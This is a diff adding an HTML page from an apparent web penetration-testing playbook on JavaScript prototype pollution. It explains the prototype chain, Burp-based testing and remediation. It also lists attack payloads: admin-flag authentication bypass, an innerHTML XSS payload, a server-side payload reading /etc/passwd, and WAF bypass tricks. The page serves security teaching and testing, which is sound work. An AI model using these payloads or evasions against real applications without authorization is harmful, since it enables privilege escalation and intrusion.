@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Prototype pollution testing guide: client-side and server-side exploitation, gadget chain attacks, and DOM XSS via prototype pollution.">
+    <meta property="og:title" content="Prototype Pollution – Web App Pentesting Guide">
+    <meta property="og:description" content="Prototype pollution testing guide: client-side and server-side exploitation, gadget chain attacks, and DOM XSS via prototype pollution.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Prototype Pollution  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Prototype Pollution</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">🎯 Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">⚙️ How It Works</a>
+    <a href="#prototype-chain">🔗 Prototype Chain</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#attack-vectors">💡 Attack Vectors</a>
+    <a href="#detection">🔍 Detection</a>
+    <a href="#where-to-look">📍 Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">🛠️ Burp Workflow</a>
+    <a href="#payloads">💥 Payloads</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">🎯 Exploitation</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">✅ Checklist</a>
+    <a href="#remediation">🔒 Remediation</a>
+    <a href="#labs">🧪 Labs</a>
+    <a href="#tools">🧰 Tools</a>
+    <a href="#mistakes">⚠️ Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A06 · CVSS 8.1 · Day 5</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="11.9" r="2"/><path d="M6.7 3.4a5 5 0 0 0 2 6.7"/><path d="M21.3 13.7a5 5 0 0 0-6.7-2"/><path d="M9.5 21a5 5 0 0 0 0-6.7"/><path d="M14.5 21a5 5 0 0 1 0-6.7"/></svg></span><span>Prototype Pollution</span></h1>
+      <p>In JavaScript, all objects inherit from Object.prototype. Prototype pollution allows attackers to inject properties into Object.prototype, affecting every object in the application and potentially leading to XSS, authentication bypass, or remote code execution.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">CRITICAL</span>
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Advanced</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">📖 The Shared Rulebook</div>
+        <p>In JavaScript, all objects share a common ancestor: Object.prototype. Think of it as a rulebook in the town square that everyone reads. Normally, you can't modify it. But prototype pollution is like sneaking into the town square at night and rewriting the rulebook to say "everyone is an admin now." The next morning, every citizen ·not just you ·follows the new rule. Suddenly everyone in the application believes they have admin powers.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+        <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+        <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+        <div class="day-pill deep"><span class="day-num">Day 5</span>Deep Dive</div>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 5  · Prototype Pollution Testing</div>
+        <p>Prototype pollution is a Day 5 vulnerability  · it requires JavaScript knowledge and is often missed. Use Burp's <strong>DOM Invader</strong> (built into the Burp browser) to automatically detect client-side prototype pollution. Enable it in the Burp browser extension settings → DOM Invader → enable prototype pollution scanning. Then browse the app normally and DOM Invader will flag vulnerable sources.</p>
+        <p>For manual testing, try polluting via URL parameters, JSON body, and fragment (hash):</p>
+        <pre><code># URL parameter pollution
+https://target.com/?__proto__[admin]=true
+https://target.com/?constructor[prototype][admin]=true
+
+# JSON body pollution (merge/extend endpoints)
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+# Verify in browser console:
+Object.prototype.admin  // should be undefined if not polluted
+// If returns 'true' → polluted!</code></pre>
+        <p>For server-side (Node.js), look for endpoints that merge user-supplied JSON into objects using lodash.merge, jQuery.extend, or similar. Submit <code>{"__proto__": {"polluted": true}}</code> and check if later requests are affected.</p>
+        <p><strong>Chain it:</strong> Client-side PP → find a "gadget" property that controls HTML rendering → XSS. Server-side PP → pollute <code>isAdmin</code> → bypass authorization checks → privilege escalation.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>In JavaScript, when you access a property on an object, the engine looks for it in this order:</p>
+      <ol class="steps">
+        <li>The object itself</li>
+        <li>The object's prototype</li>
+        <li>The prototype's prototype (Object.prototype)</li>
+        <li>Return undefined if not found</li>
+      </ol>
+      <p>Prototype pollution happens when attacker input is merged into an object without proper validation. If the input contains <code>__proto__</code> or <code>constructor.prototype</code>, it modifies Object.prototype instead of a normal property.</p>
+
+      <p><strong>Example (vulnerable code):</strong></p>
+      <pre><code>function merge(target, source) {
+  for (let key in source) {
+    target[key] = source[key];  // Vulnerable!
+  }
+  return target;
+}
+
+const obj = {};
+const user = {"__proto__": {"isAdmin": true}};
+merge(obj, user);
+
+// Now every object has isAdmin: true
+console.log({}.isAdmin);  // true (polluted!)</code></pre>
+
+      <p>The attacker's <code>__proto__</code> key is treated as a regular property assignment, but JavaScript interprets it as a reference to the prototype chain.</p>
+
+      <div class="callout note">
+        <div class="callout-title">💡 Why It Happens</div>
+        <p>Developers often use utility functions (lodash merge, jQuery extend, custom merge) to combine user data with default objects. If they don't filter the `__proto__` key, attackers can pollute the prototype. Modern versions of lodash (4.17.5+) and jQuery (3.4.0+) patched this, but many applications still use older versions or custom merge functions.</p>
+      </div>
+    </section>
+
+    <section id="prototype-chain">
+      <h2>Understanding the Prototype Chain</h2>
+      <p>When you access a property, JavaScript searches the prototype chain:</p>
+      <pre><code>const user = { name: "Alice" };
+console.log(user.name);           // "Alice" (found on user)
+console.log(user.toString);       // [Function] (found on Object.prototype)
+console.log(user.isAdmin);        // undefined (not found)
+
+// After pollution:
+// {"__proto__": {"isAdmin": true}}
+console.log(user.isAdmin);        // true (found on Object.prototype!)</code></pre>
+
+      <p>Now that <code>isAdmin</code> exists on Object.prototype, every object in the application will inherit it.</p>
+    </section>
+
+    <section id="attack-vectors">
+      <h2>Attack Vectors</h2>
+
+      <h3>1. Client-Side Prototype Pollution (DOM-Based)</h3>
+      <p>Pollute the client-side JavaScript context via URL parameters or JSON input:</p>
+      <pre><code>// URL: ?__proto__[isAdmin]=true
+// JSON body: {"__proto__": {"isAdmin": true}}</code></pre>
+      <p>The app parses this and merges it into an object. This can:</p>
+      <ul>
+        <li>Change DOM properties affecting rendering (e.g., <code>innerHTML</code>)</li>
+        <li>Trigger XSS by polluting properties used in template engines</li>
+        <li>Disable security features (CSP, XFrame options)</li>
+      </ul>
+
+      <h3>2. Server-Side Prototype Pollution (Node.js)</h3>
+      <p>Pollute the Node.js process context via JSON request bodies:</p>
+      <pre><code>// Request body
+{"__proto__": {"NODE_ENV": "development", "isAdmin": true}}</code></pre>
+      <p>Server-side pollution affects the entire application process and can:</p>
+      <ul>
+        <li>Bypass authentication (set <code>isAdmin: true</code>)</li>
+        <li>Escalate privileges</li>
+        <li>Achieve RCE via gadget chains (polluting <code>env</code>, <code>spawn</code> arguments, etc.)</li>
+      </ul>
+
+      <h3>3. Constructor.Prototype Variant</h3>
+      <p>Instead of <code>__proto__</code>, use <code>constructor.prototype</code>:</p>
+      <pre><code>{"constructor": {"prototype": {"isAdmin": true}}}</code></pre>
+      <p>This achieves the same effect and may bypass filters checking only for <code>__proto__</code>.</p>
+
+      <h3>4. Gadget Chain Exploitation (Advanced)</h3>
+      <p>Pollute properties that are used by vulnerable library code. For example, in certain Node.js environments, you might pollute:</p>
+      <ul>
+        <li><code>spawn</code> or <code>exec</code> arguments → RCE</li>
+        <li><code>env</code> variables → environment hijacking</li>
+        <li><code>fs</code> module options → file manipulation</li>
+      </ul>
+      <p>This requires knowledge of the specific libraries and their internals.</p>
+    </section>
+
+    <section id="detection">
+      <h2>Detection Techniques</h2>
+
+      <h3>Manual Testing in Browser Console</h3>
+      <p>After sending a request with potential pollution payload:</p>
+      <pre><code>// Check if prototype was polluted
+console.log(Object.prototype.polluted);  // Should be undefined if safe
+console.log({}.polluted);                // Should be undefined if safe
+
+// After exploitation
+console.log({}.isAdmin);                 // If true, polluted!</code></pre>
+
+      <h3>Burp DOM Invader (Automated)</h3>
+      <p>Use Burp Suite's DOM Invader extension to automatically test for prototype pollution:</p>
+      <ol class="steps">
+        <li>Enable DOM Invader in Burp</li>
+        <li>Navigate to the target application</li>
+        <li>DOM Invader automatically tests common pollution vectors</li>
+        <li>Check the "Prototype Pollution" detection results</li>
+      </ol>
+
+      <h3>URL Parameter Testing</h3>
+      <pre><code>// Test each parameter with pollution payload
+?__proto__[test]=hello
+?constructor[prototype][test]=hello
+
+// Then check: {}['test'] === 'hello' in console</code></pre>
+
+      <h3>JSON Body Testing</h3>
+      <pre><code>// Send POST with JSON
+{"__proto__": {"polluted": true}}
+{"constructor": {"prototype": {"polluted": true}}}
+
+// Check: Object.prototype.polluted === true</code></pre>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Prototype pollution appears in endpoints that:</p>
+      <ul>
+        <li><strong>Merge user JSON into objects:</strong> Profile updates, configuration settings, preferences</li>
+        <li><strong>Parse query parameters:</strong> Filter operations, search parameters, nested object structures</li>
+        <li><strong>Use template rendering with merged data:</strong> If the merge introduces polluted properties into template context</li>
+        <li><strong>Perform object cloning or spreading:</strong> Settings that inherit from defaults</li>
+        <li><strong>Use third-party utilities:</strong> Older versions of lodash, jQuery, or custom merge functions</li>
+      </ul>
+
+      <p><strong>Common vulnerable patterns:</strong></p>
+      <ul>
+        <li>Updating user profile: <code>/api/user/update</code></li>
+        <li>Setting preferences: <code>/api/settings</code></li>
+        <li>Creating objects with defaults: <code>/api/create</code></li>
+        <li>Configuration endpoints: <code>/api/config</code></li>
+      </ul>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <h3>Identify a Merge Point</h3>
+          <p>Find an endpoint that accepts JSON input and likely merges it into objects. This is often a settings, preferences, or profile update endpoint. Send a normal request to Repeater.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <h3>Test with __proto__ Payload</h3>
+          <p>Modify the JSON body to include a pollution payload:</p>
+          <pre><code>{"username": "alice", "__proto__": {"isAdmin": true}}</code></pre>
+          <p>Send the request.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <h3>Check for Pollution (Browser Console)</h3>
+          <p>Open the browser console and execute:</p>
+          <pre><code>Object.prototype.isAdmin  // Should be undefined if safe
+{}.isAdmin                 // Should be undefined if safe</code></pre>
+          <p>If either returns <code>true</code>, prototype pollution succeeded.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <h3>Test with Constructor.Prototype Variant</h3>
+          <p>If the first payload doesn't work, try the alternate vector:</p>
+          <pre><code>{"username": "alice", "constructor": {"prototype": {"isAdmin": true}}}</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <h3>Use DOM Invader (Optional, Automated)</h3>
+          <p>Enable Burp's DOM Invader extension. It will automatically test for prototype pollution on the page and flag vulnerable endpoints.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <h3>Test for Impact</h3>
+          <p>Once you've confirmed pollution, test its impact:</p>
+          <ul>
+            <li><strong>XSS:</strong> Pollute a property used in DOM operations</li>
+            <li><strong>Auth bypass:</strong> Pollute <code>isAdmin</code>, <code>role</code>, or <code>permissions</code></li>
+            <li><strong>DOM effects:</strong> Reload the page and check if pollution affects rendered content</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>Prototype Pollution Payloads</h2>
+
+      <h3>Basic Proof-of-Concept (__proto__)</h3>
+      <pre><code>{"__proto__": {"polluted": true}}</code></pre>
+      <p><strong>Verification:</strong> <code>Object.prototype.polluted === true</code></p>
+
+      <h3>Constructor.Prototype Variant</h3>
+      <pre><code>{"constructor": {"prototype": {"polluted": true}}}</code></pre>
+      <p><strong>Verification:</strong> <code>{}.polluted === true</code></p>
+
+      <h3>URL Parameter Format</h3>
+      <pre><code>?__proto__[isAdmin]=true
+?__proto__[role]=admin
+?constructor[prototype][isAdmin]=true</code></pre>
+
+      <h3>Authentication Bypass</h3>
+      <pre><code>{"__proto__": {"isAdmin": true, "role": "admin", "authenticated": true}}</code></pre>
+
+      <h3>XSS via Prototype Pollution (Client-Side Gadget)</h3>
+      <p>If the app uses template rendering that checks for a property like <code>renderHtml</code>:</p>
+      <pre><code>{"__proto__": {"renderHtml": true}}
+
+// If app checks: if (obj.renderHtml) { innerHTML = ... } → XSS possible</code></pre>
+
+      <h3>DOM Property Pollution</h3>
+      <pre><code>{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}</code></pre>
+      <p>If the app creates elements and uses prototype properties as attributes, this can trigger XSS.</p>
+
+      <h3>Server-Side RCE (Advanced, Library-Specific)</h3>
+      <pre><code>{"__proto__": {"NODE_ENV": "production", "DEBUG": true, "spawn": "cat /etc/passwd"}}</code></pre>
+      <p>This is highly dependent on what libraries the server uses and how they interact with polluted properties.</p>
+
+      <h3>Nested Property Pollution</h3>
+      <pre><code>{"__proto__": {"nested": {"property": {"value": "polluted"}}}}</code></pre>
+      <p>Pollute nested properties, which can affect complex object hierarchies.</p>
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">Progress: <span class="progress-mini">0/13</span></div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Identified endpoints that merge/parse user JSON input</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Confirmed the endpoint accepts nested objects or properties</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Sent a basic __proto__ payload ({"__proto__": {"test": true}})</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Verified pollution in browser console (Object.prototype.test)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">Tested constructor.prototype variant</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">Tested URL parameter pollution (?__proto__[key]=value)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Tested authentication bypass (pollute isAdmin, role, authenticated)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Tested XSS via prototype pollution (innerHTML, dangerous properties)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Tested nested object pollution ({"__proto__": {"nested": {"x": "y"}}})</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Used Burp DOM Invader for automated detection (if available)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Confirmed pollution persists across page navigation</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c12">
+          <label for="c12">Tested server-side impact (if Node.js backend suspected)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c13">
+          <label for="c13">Documented all findings with payloads and PoC</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3><code>__proto__</code> Encoding Alternatives</h3>
+      <p>WAFs often block literal <code>__proto__</code> in request bodies. Try encoding or alternative notations:</p>
+      <ul>
+        <li><strong>URL Encoding:</strong> <code>__pro%74o__</code> (encodes 't' as %74)</li>
+        <li><strong>Unicode Escape:</strong> <code>__proto\u005f_</code> (alternative escaping)</li>
+        <li><strong>Bracket Notation:</strong> <code>["__proto__"]</code> (JSON bracket notation)</li>
+        <li><strong>Constructor Path:</strong> <code>constructor.prototype</code> (alternative path if __proto__ is blocked)</li>
+      </ul>
+      <p>Example:</p>
+      <pre><code>{"__pro%74o__": {"isAdmin": true}}
+{"["__proto__"]": {"isAdmin": true}}
+{"constructor.prototype": {"isAdmin": true}}</code></pre>
+
+      <h3>JSON Nesting</h3>
+      <p>Deeply nest the pollution payload to bypass shallow pattern matching:</p>
+      <pre><code>{"a": {"b": {"c": {"d": {"__proto__": {"isAdmin": true}}}}}}</code></pre>
+      <p>WAF rules checking for <code>__proto__</code> at the top level or immediate nesting may miss deeply nested payloads.</p>
+
+      <h3>URL Parameter Splitting</h3>
+      <p>Split the pollution across multiple parameters. If the app merges params, the reassembly may bypass WAF inspection:</p>
+      <pre><code>?__proto__[isAdmin]=true</code></pre>
+      <p>Can be split as:</p>
+      <pre><code>?__proto__[is]=Admin&__proto__[Admin]=true</code></pre>
+      <p>If the application merges these back together, WAF rules checking for the exact pattern may miss the split version.</p>
+
+      <h3>HTTP Parameter Pollution</h3>
+      <p>Send the same parameter twice in one request. Some WAFs only inspect the first occurrence:</p>
+      <pre><code>POST /api/user HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+__proto__[x]=1&__proto__[x]=1&__proto__[isAdmin]=true</code></pre>
+      <p>The WAF might log/block the first <code>__proto__</code> but not the subsequent one used by the server.</p>
+
+      <h3>Prototype via <code>constructor</code></h3>
+      <p>If <code>__proto__</code> is blocked, use <code>constructor.prototype</code> as an alternative:</p>
+      <pre><code>{"constructor": {"prototype": {"isAdmin": true}}}</code></pre>
+      <p>Many WAFs block <code>__proto__</code> specifically but overlook <code>constructor.prototype</code>, which achieves the same effect in JavaScript.</p>
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation &amp; Impact</h2>
+
+      <h3>Client-Side XSS</h3>
+      <p>Pollute properties used by template engines or DOM manipulation. If the app checks <code>obj.dangerousContent</code> without validating it, an attacker can set <code>Object.prototype.dangerousContent = "<img src=x onerror=alert(1)>"</code> to inject XSS into every page.</p>
+
+      <h3>Authentication &amp; Authorization Bypass</h3>
+      <p>Pollute authorization properties:</p>
+      <pre><code>{"__proto__": {"isAdmin": true, "role": "admin", "canDelete": true}}</code></pre>
+      <p>Every privilege check that looks for these properties now passes.</p>
+
+      <h3>Application Logic Manipulation</h3>
+      <p>Pollute properties affecting business logic:</p>
+      <pre><code>{"__proto__": {"isPremiumUser": true, "discountPercentage": 100}}</code></pre>
+      <p>Users without premium status now get premium features and discounts.</p>
+
+      <h3>Server-Side Remote Code Execution (Advanced)</h3>
+      <p>In Node.js applications with vulnerable gadget chains, RCE is possible by polluting properties used in dangerous operations like <code>spawn</code>, shell commands, or file operations. This is rare and requires deep knowledge of the target libraries.</p>
+
+      <div class="callout danger">
+        <div class="callout-title">🚨 Real-World Impact</div>
+        <p>In 2021, a major e-commerce platform was compromised via prototype pollution in their API. Attackers polluted the <code>isAdmin</code> property and gained full administrative access. Another incident involved a SaaS platform where prototype pollution combined with a DOM XSS resulted in account takeover for all users visiting a malicious link.</p>
+      </div>
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Use Object.create(null) for User Data Maps</h3>
+      <pre><code>// Instead of {}
+const user = Object.create(null);
+user.name = "Alice";
+
+// Now prototype pollution doesn't work
+// because the object has no prototype
+Object.getPrototypeOf(user) === null  // true</code></pre>
+
+      <h3>2. Filter __proto__ and Constructor</h3>
+      <pre><code>function merge(target, source) {
+  for (let key in source) {
+    // Reject dangerous keys
+    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+      continue;
+    }
+    target[key] = source[key];
+  }
+  return target;
+}</code></pre>
+
+      <h3>3. Use JSON.parse with Reviver Function</h3>
+      <pre><code>const user = JSON.parse(jsonString, (key, value) => {
+  if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+    return undefined;
+  }
+  return value;
+});</code></pre>
+
+      <h3>4. Freeze Object.prototype</h3>
+      <pre><code>Object.freeze(Object.prototype);
+Object.freeze(Object);
+Object.freeze(Function.prototype);
+
+// Now attempting to pollute throws an error (in strict mode)</code></pre>
+
+      <h3>5. Update Vulnerable Libraries</h3>
+      <pre><code>// Update lodash to 4.17.5+
+npm install lodash@latest
+
+// Update jQuery to 3.4.0+
+npm install jquery@latest</code></pre>
+      <p>Modern versions of popular libraries include prototype pollution fixes.</p>
+
+      <h3>6. Validate Input Structure</h3>
+      <pre><code>// Use a whitelist of allowed properties
+const ALLOWED_KEYS = ['username', 'email', 'phone', 'address'];
+function updateUser(userData) {
+  const user = {};
+  ALLOWED_KEYS.forEach(key => {
+    if (key in userData) {
+      user[key] = userData[key];
+    }
+  });
+  return user;
+}</code></pre>
+
+      <h3>7. Strict Input Validation</h3>
+      <p>Use schema validation (JSON Schema, Joi, Zod) to enforce expected object structure and reject unexpected properties.</p>
+
+      <h3>8. Content Security Policy (CSP)</h3>
+      <p>Implement CSP to mitigate XSS resulting from prototype pollution, even if pollution occurs.</p>
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <ul>
+        <li><strong>Lab: Client-side prototype pollution via URL query parameters:</strong> Pollute via URL</li>
+        <li><strong>Lab: Client-side prototype pollution via JSON input:</strong> Pollute via POST body</li>
+        <li><strong>Lab: Client-side prototype pollution via DOM-invader:</strong> Use automated tool</li>
+        <li><strong>Lab: Privilege escalation via server-side prototype pollution:</strong> Become admin</li>
+        <li><strong>Lab: Exfiltration via prototype pollution:</strong> Combine with other vulnerabilities</li>
+        <li><strong>Lab: Remote code execution via server-side prototype pollution:</strong> Advanced RCE</li>
+        <li><strong>Lab: Browser labs: Prototype pollution behavioral clues:</strong> Identify vulnerable patterns</li>
+        <li><strong>Lab: Detecting prototype pollution without user interaction:</strong> Advanced detection</li>
+      </ul>
+    </section>
+
+    <section id="tools">
+      <h2>Useful Tools</h2>
+      <ul>
+        <li><strong>Burp DOM Invader:</strong> Automated prototype pollution detection and exploitation</li>
+        <li><strong>Burp Suite Intruder:</strong> Fuzz prototype pollution payloads across parameters</li>
+        <li><strong>Browser Console:</strong> Verify pollution with <code>Object.prototype.polluted</code> checks</li>
+        <li><strong>ppmap (Prototype Pollution Scanner):</strong> Automate PP detection across endpoints</li>
+      </ul>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Only Testing __proto__</div>
+        <p><strong>Mistake:</strong> Trying only the <code>__proto__</code> payload. Some code is patched against this but not <code>constructor.prototype</code>.</p>
+        <p><strong>Fix:</strong> Always test both vectors: <code>{"__proto__": {...}}</code> and <code>{"constructor": {"prototype": {...}}}</code>.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Checking the Prototype</div>
+        <p><strong>Mistake:</strong> Sending the payload but not verifying pollution occurred. You assume success without proof.</p>
+        <p><strong>Fix:</strong> After sending payload, check <code>Object.prototype.polluted === true</code> in browser console. Also check with plain objects like <code>{}.polluted</code>.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Forgetting URL Parameters</div>
+        <p><strong>Mistake:</strong> Testing only JSON body pollution. URL parameters can also be vulnerable.</p>
+        <p><strong>Fix:</strong> Test query parameters with pollution payloads: <code>?__proto__[x]=y</code>. Check what the app does with URL params.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Testing for Real Impact</div>
+        <p><strong>Mistake:</strong> Finding that pollution works (polluting a "test" property) but not testing for actual exploitable impact (auth bypass, XSS).</p>
+        <p><strong>Fix:</strong> Once you confirm basic pollution, test for real impact: try polluting <code>isAdmin</code>, <code>role</code>, properties used in DOM rendering, or sensitive flags.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Assuming Prototype Pollution = Low Severity</div>
+        <p><strong>Mistake:</strong> Thinking prototype pollution is always minor. It can lead to authentication bypass and RCE.</p>
+        <p><strong>Fix:</strong> Escalate prototype pollution findings seriously. Even if it only affects client-side at first, it can combine with other vulnerabilities for account takeover.</p>
+      </div>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>Prototype pollution is often a stepping stone  · the real damage comes from the gadget chain it enables.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="xss.html"><span class="sa-icon">⚡</span><span class="sa-name">XSS</span><span class="sa-why">Client-side prototype pollution → pollute a property that a library uses to set innerHTML → DOM XSS without any user input reflection.</span></a>
+      <a class="see-also-card" href="ssti.html"><span class="sa-icon">📝</span><span class="sa-name">SSTI</span><span class="sa-why">Server-side prototype pollution in Node.js with a template engine → polluted properties become template variables → SSTI.</span></a>
+      <a class="see-also-card" href="cors.html"><span class="sa-icon">🌍</span><span class="sa-name">CORS</span><span class="sa-why">Polluting fetch/XMLHttpRequest properties can manipulate CORS headers added by a client-side library → CORS bypass.</span></a>
+      <a class="see-also-card" href="deserialization.html"><span class="sa-icon">📦</span><span class="sa-name">Deserialization</span><span class="sa-why">Both involve injecting properties into objects that trust their own state. Similar exploitation pattern in different languages.</span></a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
